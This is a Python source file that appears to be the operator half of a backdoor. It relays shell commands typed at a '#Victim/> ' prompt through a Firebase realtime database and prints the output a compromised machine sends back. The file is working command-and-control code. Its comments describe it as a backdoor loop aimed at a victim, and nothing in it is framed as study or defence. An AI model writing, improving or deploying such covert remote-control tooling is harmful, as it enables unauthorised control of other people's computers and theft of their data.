import subprocess
import pyrebase
import sys
import Configs


class Host:
    """
    Creates a continuous connection with a host using firebase to
    transfer input and output strings.
    """
    def __init__(self):
        # Firebase WebApp Config
        self.config = Configs.config

        # Initialize Pyrebase App
        self.app = pyrebase.initialize_app(self.config)

        # Establishes a connection with the database
        # EXAMPLE FIREBASE REAL TIME DATABASE(RTDB)::
        #
        # Default-Firebase-RTDB:
        # |__ 'output' : 'N/A'
        # |__ 'input' : 'N/A'
        #
        self.shell = self.app.database()

        # Maximum amount of time(in seconds) to wait for output from the victim
        self.output_verify_limit = 60

    def connect(self):
        """
        Initialize the backdoor loop
        """
        # Verify that the output value in the database is empty
        if self.shell.child('output').get().val() != 'N/A':

            # If it is not empty, update both the input and output values to 'N/A'(or None)
            self.shell.update({'input': 'N/A',
                               'output': 'N/A'})

        # Start the connection loop
        while True:

            # Grab the values for the input and output
            input_ = self.shell.child('input').get().val()
            output_ = self.shell.child('output').get().val()

            # If input and output are empty, check for user input
            if input_ == 'N/A' and output_ == 'N/A':
                userin = input("#Victim/> ")

                # Update the input to be equal to user's input
                self.shell.update({'input': userin})

            # If the input is empty and the output is not, assume that we have recieved output from the client
            elif input_ == 'N/A' and output_ != 'N/A':
                try:
                    # Seperate the output string into multiple lines by splitting the output by '\r\n'.
                    # The output string is a bytes-like object and REFUSES to convert to a UTF-8 string.
                    # So I'm having to use this trick to seperate the huge single-lined string to multi-lined
                    for line in output_[1::].split('\\r\\n'):
                        print(line)
                except TypeError:
                    # If the output still can't be converted to a multi-lined string, assume that it isn't one
                    print(output_)

                # Update the input and output values in database to be empty
                self.shell.update({'input': 'N/A',
                                   'output': 'N/A'})

            # If the input value in the database isn't empty and the output is, assume that we are
            # waiting for input from the client
            elif input_ != 'N/A' and output_ == 'N/A':
                # Check that the output wait time hasn't been exceeded.
                # If it hasn't, subtract 1 from the counter. Otherwise, Notify the user of the error
                # and reset the input and output. This can mean that there are no client's responding.
                # Occasionally though, it could mean an error occurred in the client's shell.
                if self.output_verify_limit > 0:
                    self.output_verify_limit -= 1
                elif self.output_verify_limit == 0:
                    self.output_verify_limit = 0
                    print('Output wait time exceeded!!')
                    self.shell.update({'input': 'N/A',
                                       'output': 'N/A'})


if __name__ == '__main__':
    c = Host()
    c.connect()
